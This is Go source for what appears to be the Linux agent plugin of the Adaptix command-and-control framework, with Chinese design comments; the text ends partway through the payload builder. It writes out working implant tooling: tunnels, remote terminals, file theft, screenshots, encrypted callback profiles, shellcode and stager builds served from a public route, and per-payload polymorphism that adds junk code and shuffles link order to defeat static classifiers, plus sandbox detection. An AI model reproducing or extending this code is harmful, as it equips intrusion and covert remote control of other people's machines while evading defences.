package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2"
	"github.com/google/shlex"
	"github.com/vmihailenco/msgpack/v5"
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string

	// Public HTTP endpoints for productized Stager payload hosting
	TsEndpointRegisterPublicRaw(method string, path string, handler func(w http.ResponseWriter, r *http.Request)) error
	TsEndpointUnregisterPublic(method string, path string) error
	TsEndpointExistsPublic(method string, path string) bool

	// Authenticated HTTP endpoints (batch 20: BOF list / upload / compile).
	// ★ 为什么这三行不需要改核心：extender.Teamserver（core/extender/utils.go:86-88）
	//   本就声明了同名同签名的三件套，而 core/server/server.go:58 `NewExtender(ts)`
	//   传进去的就是 *server.Teamserver 本人 ⇒ *server.Teamserver 必然实现它们，
	//   本地接口只是把它再声明一遍（见 core/server/ts_endpoints.go:10）。
	//   与上面 Public 组的区别是承载组：connector.go:368 给 api_group 挂了
	//   token.ValidateAccessToken()，username 由 token/jwt.go:101 写入。
	//   ★ 反面：/bofs/upload 与 /bofs/compile 语义上就是「在 teamserver 上落文件
	//   并调编译器」，做成 public 等于把 RCE 挂公网 ⇒ 必须走这一组。
	TsEndpointRegister(method string, path string, handler func(username string, body []byte) (int, []byte)) error
	TsEndpointUnregister(method string, path string) error
	TsEndpointExists(method string, path string) bool
}

// axScriptDirsProvider —— **可选**能力：服务端本部署已加载 axscript 的所在目录。
//
// ★ 为什么不加进上面的必需 Teamserver 接口：
//   上面那个断言失败就走 `return nil`，**整个 linux agent 直接消失**
//   （extender.go:161 收到 nil 就 logs.Error 并跳过本插件）。为了让 BOF 候选能
//   动态定位根目录，把一个「老服务端没有」的方法塞进必需接口，等于让新插件
//   无法在旧服务端上运行 —— 赌上的是 agent 本身，换来的只是补全提示。
//   单独断言 + 降级兜底（bofsExecRoots）才是对的代价结构。
type axScriptDirsProvider interface {
	TsAxScriptDirs() []string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string

	// AxScriptDirs：本部署已加载 axscript 的目录集（去重折叠后）。
	// nil ⇒ 服务端不支持该能力（老版本），调用方必须准备兜底路径。
	// 存成函数值而不是把 Ts 存下来再断言，是为了让单测能直接替身它。
	AxScriptDirs func() []string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	// ★★ ModuleDir 必须在这里**一次性绝对化**，这是全插件路径正确性的唯一收口点。
	//
	//    moduleDir 源自 profile 的挂载串（"extenders/linux_agent/config.yaml"），
	//    天生是**相对**路径；而它下挂的一切——stager 模板、matrix manifest、
	//    BOF 的源/头/产物——都会被拼成路径后交给**按进程 cwd 解析**的系统调用
	//    （os.Stat / os.ReadFile / exec 的 cmd.Dir）。
	//    cwd 恰好是 teamserver 根目录时侥幸能中；换个 cwd（systemd 的
	//    WorkingDirectory、`cd /tmp && ./adaptixserver`、任何包装脚本）就失效，
	//    而且是**静默**失效——报错离真因十万八千里。
	//
	//    生产实证（批次20 运行态，非推演）：gcc 同时拿到**相对**源路径与**相对**
	//    cmd.Dir，于是相对路径被二次解析，变成
	//    "extenders/linux_agent/extenders/linux_agent/src_agent/bofs/x.c"
	//    ⇒ `cc1: fatal error: No such file or directory`。
	//    BOF 的 base 也同根：回给前端的相对路径会让 `execute bof` 的 os.Stat
	//    随 cwd 漂移，失败后静默落进 base64 分支，agent 收到一串**路径文本**
	//    当 BOF 字节。
	//
	//    为什么单元测试没抓到：所有用例都把 ModuleDir 设成 t.TempDir 系的
	//    **绝对**临时目录 —— 「相对 ModuleDir」这个生产实况一次都没进过。
	//    现由 TestBofsCompileUnderRelativeModuleDir 与
	//    TestBofsBaseStaysAbsoluteUnderRelativeModuleDir 两条钉死。
	//
	//    在赋值点折进 cwd，语义与 os.Stat 完全同源，下游零改动。
	if abs, err := filepath.Abs(moduleDir); err == nil {
		moduleDir = abs
	}
	ModuleDir = moduleDir
	AgentWatermark = watermark
	// ★ 原来是单值断言 `Ts = ts.(Teamserver)`：接口一旦漂移（核心改了方法签名，
	//   或本文件的接口声明多写了一个核心没有的方法）就 **panic**。而这条 panic 路径
	//   在插件加载里 —— core/extender/extender.go:160 直接调 pl_InitPlugin，
	//   中间没有 recover ⇒ 一个插件的接口不匹配会掀翻**整台 teamserver** 的加载流程。
	//   改成 comma-ok 后降级为「本插件不生效 + 明确日志」，且 extender.go:161
	//   本来就检查 nil 返回值（`if pl_agent == nil { logs.Error(...); return }`），
	//   所以返回 nil 是被调用方正确处理的一等路径，不是新引入的失败模式。
	t, ok := ts.(Teamserver)
	if !ok {
		fmt.Printf("[linux_agent] FATAL: teamserver object does not satisfy the Teamserver interface; extender disabled\n")
		return nil
	}
	Ts = t

	// 可选能力：服务端能报出本部署的 axscript 目录 ⇒ BOF 候选根就不必再猜。
	// 断言的是**收到的这个对象**（ts any，动态类型 *server.Teamserver），不是 Ts ——
	// 后者静态类型是必需接口，看不到可选方法。
	if p, ok := ts.(axScriptDirsProvider); ok {
		AxScriptDirs = p.TsAxScriptDirs
	} else {
		fmt.Printf("[linux_agent] WARNING: teamserver has no TsAxScriptDirs; BOF roots fall back to relative guesses (deployments outside the default layout may list nothing)\n")
	}

	_ = gMatrix.Load(moduleDir) // Phase 3: matrix manifest (non-fatal when absent)
	if err := linuxStagerInitRoutes(); err != nil {
		fmt.Printf("[linux_agent] stager route init failed: %v\n", err)
	} else {
		fmt.Printf("[linux_agent] stager payload route ready: GET /s/:token\n")
	}
	// batch 20: authenticated BOF routes (list / upload / compile / exec)
	//
	// ★ 横幅由 bofsInitRoutes 自己打印 —— 它手里才有 routes 表。原来这里手抄
	//   一份清单，加了 /bofs/exec 之后横幅照旧只列三条：**日志在说谎**，而
	//   「日志说注册了」正是排查时最先信的那条证据。清单只能有一个出处。
	if err := bofsInitRoutes(); err != nil {
		fmt.Printf("[linux_agent] bofs routes init failed: %v\n", err)
	}
	// .o 不在构建产物里（运行期 gcc 现编）⇒ 全新部署一个都没有，而前端的
	// `execute bof ` 补全只认 obj !== false 的条目 ⇒ 候选静默为空、还不报错。
	// 这里补齐缺失/过期的产物，让部署开箱即用（健康部署下零开销）。
	bofsAutoCompile()
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

// getFloatArg 读一个数值参数。
//
// ★ 必须收 int：axscript 的 addArgInt 在 core/axscript/parser.go:152 走
// strconv.Atoi，落到 CreateCommand 的 args 里是 Go int，不是 float64。
// 原来这里只做 .(float64) 断言 ⇒ 对 addArgInt 参数必然失败 ⇒ 调用方
// goto RET ⇒ 发出 code=0 的任务 ⇒ agent 回 "Unknown command"。
// 受影响：inject / kill / ps kill / link / listen，见各调用点。
//
// 缺参或非数值仍然报错 —— 放宽的是类型，不是错误语义。
// （续行不留前导空格：gofmt 会把缩进的续行当代码块重排。）
func getFloatArg(args map[string]any, key string) (float64, error) {
	switch v := args[key].(type) {
	case float64:
		return v, nil
	case int:
		return float64(v), nil
	case int64:
		return float64(v), nil
	}
	return 0, fmt.Errorf("parameter '%s' must be set", key)
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/// TUNNEL

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	inner, _ := msgpack.Marshal(ParamsTunnelWrite{ChannelId: channelId, Data: data})
	cmd := Command{Code: COMMAND_TUNNEL_WRITE, Data: inner}
	packData, _ := msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	inner, _ := msgpack.Marshal(ParamsTunnelWrite{ChannelId: channelId, Data: data})
	cmd := Command{Code: COMMAND_TUNNEL_WRITE, Data: inner}
	packData, _ := msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelPause{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_PAUSE, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelResume{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_RESUME, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

/// TERMINAL

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
	cmd := Command{Code: COMMAND_TERMINAL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTerminalStop{TermId: terminalId})
	cmd := Command{Code: COMMAND_TERMINAL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Format           string `json:"format"`
	Arch             string `json:"arch"`
	ReconnectTimeout string `json:"reconn_timeout"`
	ReconnectCount   int    `json:"reconn_count"`
	OpsecEnabled     bool   `json:"opsec_enabled"`
	// 云主机（KVM/QEMU ECS）与分析沙箱在 DMI/cpuinfo 上不可区分，VM 检测
	// 默认只跑不拦；明确只打物理机时才勾选它（→ -DOPSEC_VM_EXIT）。
	OpsecVmExit bool `json:"opsec_vm_exit"`

	// --- Stager 下载端点的来源（仅 Stager 格式用到）---
	//
	// 与 beacon_agent/pl_main.go 的 GenerateConfig 同义、同 JSON 键名：产品化 Stager
	// 从**团队服务器自己的 HTTP endpoint** 的 /s/:token 取载荷，生成时必须知道那个
	// endpoint 在哪。**主路径是控制台表单**（所有操作员都在 WebUI 上操作），进程环境
	// 变量只作回退；两者都缺时硬报错，绝不静默回落 8080（那是 agent 监听器）。
	StagerTSHost string `json:"stager_ts_host"`
	StagerTSPort int    `json:"stager_ts_port"`
	// 指针：区分「没填」与「明确填 false（明文端点）」。nil ⇒ 交由回退决定。
	StagerTSSSL *bool `json:"stager_ts_ssl"`
}

var SrcPath = "src_macos" // Go fallback (unused for native C builds)

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		var (
			generateConfig GenerateConfig
			profileData    []byte
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		listenerWatermark, err := strconv.ParseInt(transportProfile.Watermark, 16, 64)
		if err != nil {
			return nil, err
		}

		encrypt_key, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}

		reconnectTimeout, err := parseDurationToSeconds(generateConfig.ReconnectTimeout)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		// Infer protocol from other fields when "protocol" key is not in l_data
		// BeaconWS sets protocol="http" (from listener WS plugin) — map it to "ws"
		if protocol == "" || protocol == "http" {
			if _, hasWsUri := listenerMap["uri"]; hasWsUri {
				protocol = "ws"
			} else if _, hasTcpBanner := listenerMap["tcp_banner"]; hasTcpBanner {
				protocol = "tcp"
			} else if _, hasBind := listenerMap["port_bind"]; hasBind {
				protocol = "bind_tcp"
			}
		}
		isGopher := (protocol == "tcp") // GopherTCP uses "tcp", LinuxTCP uses "bind_tcp"
		switch protocol {

		case "tcp":

			tcp_banner, _ := listenerMap["tcp_banner"].(string)

			servers, _ := listenerMap["callback_addresses"].(string)

			servers = strings.ReplaceAll(servers, " ", "")
			servers = strings.ReplaceAll(servers, "\n", ",")
			servers = strings.TrimSuffix(servers, ",")
			addresses := strings.Split(servers, ",")

			var sslKey []byte
			var sslCert []byte
			var caCert []byte
			Ssl, _ := listenerMap["ssl"].(bool)
			if Ssl {
				ssl_key, _ := listenerMap["client_key"].(string)
				sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
				if err != nil {
					return nil, err
				}

				ssl_cert, _ := listenerMap["client_cert"].(string)
				sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
				if err != nil {
					return nil, err
				}

				ca_cert, _ := listenerMap["ca_cert"].(string)
				caCert, err = base64.StdEncoding.DecodeString(ca_cert)
				if err != nil {
					return nil, err
				}
			}

			profile := Profile{
				Type:              uint(agentWatermark),
				ListenerWatermark: uint(listenerWatermark),
				Addresses:         addresses,
				BannerSize:        len(tcp_banner),
				ConnTimeout:       reconnectTimeout,
				ConnCount:         generateConfig.ReconnectCount,
				UseSSL:            Ssl,
				SslCert:           sslCert,
				SslKey:            sslKey,
				CaCert:            caCert,
			}
			// GopherTCP: zero watermark so agent detects GopherTCP mode (watermark==0)
			if isGopher {
				profile.ListenerWatermark = 0
			}
			profileData, _ = msgpack.Marshal(profile)

		case "bind_tcp":
			port, _ := listenerMap["port_bind"].(float64)

			// Reverse pivot (opt-in): when the operator lists parent callback
			// addresses, the generated agent dials the parent instead of
			// listening -- no inbound reachability needed, no listening port.
			// When the key is absent or empty, bindAddrs stays an empty (non-nil)
			// slice so the marshalled profile is identical to the original.
			var bindAddrs []string
			switch raw := listenerMap["callback_addresses"].(type) {
			case []interface{}:
				for _, a := range raw {
					if s, ok := a.(string); ok {
						if s = strings.TrimSpace(s); s != "" {
							bindAddrs = append(bindAddrs, s)
						}
					}
				}
			case string:
				for _, a := range strings.Split(strings.ReplaceAll(raw, "\n", ","), ",") {
					if a = strings.TrimSpace(a); a != "" {
						bindAddrs = append(bindAddrs, a)
					}
				}
			}
			if bindAddrs == nil {
				bindAddrs = []string{}
			}

			profile := Profile{
				Type:              uint(agentWatermark),
				ListenerWatermark: uint(listenerWatermark),
				Addresses:         bindAddrs,
				BannerSize:        0,
				ConnTimeout:       0,
				ConnCount:         0,
				BindPort:          int(port),
			}
			profileData, _ = msgpack.Marshal(profile)
		case "ws", "https":
			isHttpsEmu := protocol == "https"
			// callback_addresses can be string or []interface{} — handle both
			var addresses []string
			switch addrs := listenerMap["callback_addresses"].(type) {
			case string:
				addrs = strings.ReplaceAll(addrs, " ", "")
				addrs = strings.ReplaceAll(addrs, "\n", ",")
				addrs = strings.TrimSuffix(addrs, ",")
				addresses = strings.Split(addrs, ",")
			case []interface{}:
				for _, a := range addrs {
					if s, ok := a.(string); ok {
						addresses = append(addresses, s)
					}
				}
			}

			var uriList []string
			if uris, ok := listenerMap["uri"].([]interface{}); ok {
				for _, u := range uris {
					if s, ok := u.(string); ok {
						uriList = append(uriList, s)
					}
				}
			}

			var uaList []string
			if uas, ok := listenerMap["user_agent"].([]interface{}); ok {
				for _, u := range uas {
					if s, ok := u.(string); ok {
						uaList = append(uaList, s)
					}
				}
			}

			hbHeader, _ := listenerMap["hb_header"].(string)
			if hbHeader == "" {
				hbHeader = "X-Requested-With"
			}

			profile := Profile{
				Type:              uint(agentWatermark),
				ListenerWatermark: uint(listenerWatermark),
				Addresses:         addresses,
				BannerSize:        0,
				ConnTimeout:       reconnectTimeout,
				ConnCount:         generateConfig.ReconnectCount,
				UseSSL:            sslFromListenerMap(listenerMap), // H1: WSS when the WS listener serves TLS
				Uris:              uriList,
				UaList:            uaList,
				UaCount:           len(uaList),
				AnsSize:           0, // Will be computed from WebPageOutput template length
				AnsPreSize:        0,
				IsHttpsEmu:        isHttpsEmu,
				HeartbeatHeader:   hbHeader,
			}

			// Compute ans_pre_size from WebPageOutput template
			if webPageOutput, ok := listenerMap["page-payload"].(string); ok && webPageOutput != "" {
				payloadPlaceholder := "<<<PAYLOAD_DATA>>>"
				b64Len := len(payloadPlaceholder)
				// ans_pre_size is the offset of <<<PAYLOAD_DATA>>> in the template
				idx := strings.Index(webPageOutput, payloadPlaceholder)
				if idx >= 0 {
					profile.AnsPreSize = idx
					profile.AnsSize = len(webPageOutput) - idx - b64Len
				}
			}
			profileData, _ = msgpack.Marshal(profile)

		default:
			return nil, errors.New("protocol unknown")
		}

		extHandler := ExtenderAgent{}
		profileData, _ = extHandler.Encrypt(profileData, encryptKey)
		profileData = append(encryptKey, profileData...)

		profileString := ""
		for _, b := range profileData {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))
	}
	return agentProfiles, nil
}

/// Native C agent build constants

var (
	NativeSrcDir   = "src_agent/agent"
	NativeObjFiles = []string{"crt", "msgpack", "crypt", "dns", "connector", "agent_info", "commander", "tasks_fs", "tasks_proc", "tasks_linux", "tasks_opsec", "jobs", "tasks_async", "tasks_net", "proxyfire", "elf_resolve", "opsec", "pivot", "tasks_pivot", "ax_vsnprintf", "bof_api", "elf_bof", "ws_connector", "https_emu", "timing", "noise"}

	// Embedded mbedtls (H1 WSS transport) — trimmed TLS1.3 client build
	NativeMbedtlsSrcDir = "src_agent/mbedtls/library"
	NativeMbedtlsObjs   = []string{"aes", "aesni", "asn1parse", "asn1write", "bignum", "bignum_core", "bignum_mod", "bignum_mod_raw", "chacha20", "chachapoly", "ccm", "cipher", "cipher_wrap", "constant_time", "ecdh", "ecdsa", "ecp", "ecp_curves", "entropy", "error", "gcm", "hmac_drbg", "md", "oid", "pk", "pk_ecc", "pk_wrap", "pkparse", "platform", "platform_util", "poly1305", "psa_crypto", "psa_crypto_aead", "psa_crypto_cipher", "psa_crypto_client", "psa_crypto_driver_wrappers_no_static", "psa_crypto_ecp", "psa_crypto_hash", "psa_crypto_mac", "psa_crypto_rsa", "psa_crypto_se", "psa_crypto_slot_management", "psa_util", "sha256", "sha512", "ssl_ciphersuites", "ssl_client", "ssl_msg", "ssl_tls", "ssl_tls13_client", "ssl_tls13_generic", "ssl_tls13_keys", "x509", "x509_crt"}
)

// Compiler selection based on architecture
func nativeCompiler(arch string) string {
	if arch == "aarch64" || arch == "arm64" {
		return "aarch64-linux-gnu-gcc"
	}
	return "musl-gcc"
}

func nativeCFlags(arch string) string {
	base := "-std=gnu11 -Os -U_FORTIFY_SOURCE -fno-stack-protector -fno-builtin -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-ident -Wall -Wextra -Wno-unused-parameter -Wno-unused-function -Wno-cast-function-type -I src_agent/mbedtls/include -I src_agent/mbedtls -DMBEDTLS_CONFIG_FILE='<mbedtls_config_agent.h>'"
	if arch == "aarch64" || arch == "arm64" {
		return base + " -DARCH_AARCH64"
	}
	return base + " -DARCH_X86_64"
}

// sslFromListenerMap — "ssl" key of the WS listener config JSON (H1 WSS flag)
func sslFromListenerMap(m map[string]interface{}) bool {
	if v, ok := m["ssl"].(bool); ok {
		return v
	}
	return false
}

// compileMbedtlsObjects — compile the embedded mbedtls objects + zero-libc glue
// into tempDir. Reused by the ELF/SO/shellcode builders.
func compileMbedtlsObjects(profile adaptix.BuildProfile, currentDir, tempDir, compiler, cFlags string, compileSrc func(string, string) error) error {
	for _, ofile := range NativeMbedtlsObjs {
		if err := compileSrc(NativeMbedtlsSrcDir+"/"+ofile+".c", ofile); err != nil {
			return fmt.Errorf("compile mbedtls %s: %w", ofile, err)
		}
	}
	if err := compileSrc("src_agent/mbedtls/mbedtls_glue.c", "mbedtls_glue"); err != nil {
		return fmt.Errorf("compile mbedtls glue: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Embedded mbedtls (TLS1.3) compiled")
	return nil
}

func nativeLFlags(arch string) string {
	return "-static -nostdlib -nodefaultlibs -s -Wl,--build-id=none"
}

// ---- Per-payload polymorphism ----

// shuffleObjects returns a copy of s in random order (Fisher-Yates with
// crypto randomness). Randomizing link order yields a distinct .text /
// .rodata layout per payload, defeating skeleton-level static similarity.
func shuffleObjects(s []string) []string {
	out := append([]string(nil), s...)
	for i := len(out) - 1; i > 0; i-- {
		j := int(cryptoRandUint32() % uint32(i+1))
		out[i], out[j] = out[j], out[i]
	}
	return out
}

// generateJunkC builds a per-payload junk.c: random-named functions doing
// harmless arithmetic (kept in .text because the link does not use
// --gc-sections) plus a random-named, random-sized .rodata blob. Every
// payload carries unique code/data entropy for static classifiers.
func generateJunkC() string {
	var sb strings.Builder
	sb.WriteString("/* per-payload junk (polymorphism) */\n")
	nfuncs := 2 + int(cryptoRandUint32()%4)
	for i := 0; i < nfuncs; i++ {
		name := fmt.Sprintf("fn_%08x", cryptoRandUint32())
		fmt.Fprintf(&sb, "static volatile unsigned long %s(unsigned long x) {\n", name)
		fmt.Fprintf(&sb, "    unsigned long y = x ^ 0x%08xUL;\n", cryptoRandUint32())
		fmt.Fprintf(&sb, "    y = (y * 0x%08xUL) + 0x%08xUL;\n", cryptoRandUint32()|1, cryptoRandUint32())
		sb.WriteString("    y ^= y >> 13;\n")
		fmt.Fprintf(&sb, "    return y + 0x%08xUL;\n", cryptoRandUint32())
		sb.WriteString("}\n")
	}
	blobName := fmt.Sprintf("blob_%08x", cryptoRandUint32())
	blobSize := 128 + int(cryptoRandUint32()%640)
	fmt.Fprintf(&sb, "static const unsigned char %s[%d] = {\n", blobName, blobSize)
	for i := 0; i < blobSize; i += 12 {
		b := make([]byte, 12)
		_, _ = rand.Read(b)
		parts := make([]string, 12)
		for k := 0; k < 12; k++ {
			parts[k] = fmt.Sprintf("0x%02x", b[k])
		}
		fmt.Fprintf(&sb, "    %s,\n", strings.Join(parts, ","))
	}
	sb.WriteString("};\n")
	return sb.String()
}

// writeJunkAndCompile writes the per-payload junk.c into tempDir and
// compiles it with the same flags as the agent sources. Returns the
// object path to append to the link step.
func (p *PluginAgent) writeJunkAndCompile(profile adaptix.BuildProfile, tempDir string, compiler string, cFlags string) (string, error) {
	if err := os.WriteFile(tempDir+"/junk.c", []byte(generateJunkC()), 0644); err != nil {
		return "", err
	}
	junkObj := tempDir + "/junk.o"
	cmdStr := fmt.Sprintf("%s %s -c %s -o %s", compiler, cFlags, tempDir+"/junk.c", junkObj)
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, "sh", "-c", cmdStr); err != nil {
		return "", fmt.Errorf("compile junk.c: %w", err)
	}
	return junkObj, nil
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var generateConfig GenerateConfig

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-linux-*")
	if err != nil {
		return nil, "", err
	}

	arch := strings.ToLower(generateConfig.Arch)
	if arch == "" || arch == "x64" {
		arch = "x86_64"
	}

	switch generateConfig.Format {
	case "Binary ELF (Native)":
		return p.buildNativeELF(profile, agentProfiles, generateConfig, currentDir, tempDir, arch)
	case "Shared Object (Native)":
		return p.buildNativeSO(profile, agentProfiles, generateConfig, currentDir, tempDir, arch)
	case "Shellcode x86_64 (Native)":
		return p.buildNativeShellcodeX64(profile, agentProfiles, generateConfig, currentDir, tempDir)
	case "Shellcode ARM64 (Native)":
		return p.buildNativeShellcodeARM64(profile, agentProfiles, generateConfig, currentDir, tempDir)
	case "Stager":
		// Build arch-appropriate shellcode, then wrap in productized Linux stager ELF.
		var sc []byte
		var err error
		if arch == "ARM64" || arch == "aarch64" || arch == "arm64" {
			sc, _, err = p.buildNativeShellcodeARM64(profile, agentProfiles, generateConfig, currentDir, tempDir)
		} else {
			sc, _, err = p.buildNativeShellcodeX64(profile, agentProfiles, generateConfig, currentDir, tempDir)
		}
		if err != nil {
			return nil, "", err
		}
		// listener map for host resolution
		var listenerMap map[string]any
		if len(profile.ListenerProfiles) > 0 {
			_ = json.Unmarshal(profile.ListenerProfiles[0].Profile, &listenerMap)
		}
